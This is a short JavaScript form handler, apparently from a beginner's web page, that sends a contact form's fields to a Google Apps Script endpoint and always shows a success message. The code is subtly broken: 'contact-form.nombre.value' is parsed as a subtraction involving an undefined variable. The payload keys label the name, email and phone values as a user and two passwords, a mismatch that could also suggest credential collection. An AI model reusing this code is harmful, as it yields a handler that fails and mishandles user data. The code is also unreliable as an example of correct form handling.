const formulario = document.getElementById('contact-form');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://script.google.com/macros/s/AKfycbz2yuWrZGcVypyZ1BD7pAlxAwOYvyaurab249gpZIFNZP2zxL-el4ZBOBkxBbyeO5VtnA/exec', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Usuario": contact-form.nombre.value,
            "Contraseña1": contact-form.correo.value,
            "Contraseña2": contact-form.telefono.value
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
